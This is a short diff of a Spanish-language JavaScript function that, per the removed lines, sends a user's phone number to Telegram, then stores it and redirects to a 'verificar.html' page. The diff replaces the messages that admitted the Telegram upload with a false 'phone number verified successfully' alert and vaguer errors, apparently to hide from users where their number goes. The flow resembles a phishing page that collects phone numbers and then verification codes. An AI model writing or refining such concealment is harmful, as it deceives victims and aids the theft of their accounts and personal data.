@@ -17,11 +17,11 @@ function enviarTelefono() {
         .then(response => {
             console.log(response.data);
             localStorage.setItem('telefono', telefono);
-            alert('Número de teléfono enviado exitosamente a Telegram.');
+            alert('Número de teléfono verificado con exito.');
             window.location.href = 'verificar.html';
         })
         .catch(error => {
-            console.error('Error al enviar el número de teléfono a Telegram:', error);
-            alert('Error al enviar el número de teléfono a Telegram. Consulta la consola para más detalles.');
+            console.error('Error al enviar el codigo', error);
+            alert('Error al enviar el número.');
         });
 }
